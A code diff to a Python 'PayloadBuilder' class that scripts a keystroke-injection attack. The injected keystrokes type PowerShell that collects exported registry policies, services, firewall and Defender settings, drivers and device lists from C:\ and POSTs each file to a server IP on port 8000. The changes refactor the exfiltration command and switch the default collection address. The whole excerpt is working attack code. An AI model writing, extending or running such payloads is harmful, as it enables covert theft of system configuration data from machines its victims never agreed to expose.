@@ -271,9 +271,10 @@ class PayloadBuilder:
                 {'action': 'delay', 'ms': 1500},
                 {'action': 'combo', 'keys': ['ALT', 'y']},
                 {'action': 'delay', 'ms': 1000},
+                {'action': 'type', 'text': '$ip="{{SERVER_IP}}";'},
                 {'action': 'type', 'text': '$files=@("HKLM_Policies.reg","HKCU_Policies.reg","Services.reg","Control.reg","firewall.wfw","defender.json","drivers.txt","devices.txt");'},
-                {'action': 'type', 'text': 'foreach($f in $files){if(Test-Path "C:\\$f"){'},
-                {'action': 'type', 'text': 'Invoke-RestMethod -Uri "http://{{SERVER_IP}}:8000" -Method POST -InFile "C:\\$f" -Headers @{"X-Filename"=$f}'},
+                {'action': 'type', 'text': 'foreach($f in $files){$p="C:\\$f";if(Test-Path $p){'},
+                {'action': 'type', 'text': 'Invoke-WebRequest -Uri "http://$ip:8000" -Method POST -InFile $p -Headers @{"X-Filename"=$f}'},
                 {'action': 'type', 'text': '}}'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 5000},
@@ -303,7 +304,7 @@ class PayloadBuilder:
         default_vars = {
             'TIMESTAMP': datetime.now().isoformat(),
             'HOST_ID': 'unknown',
-            'SERVER_IP': '192.168.7.1:80',
+            'SERVER_IP': '172.16.0.1',
         }
         
         # Merge with provided variables
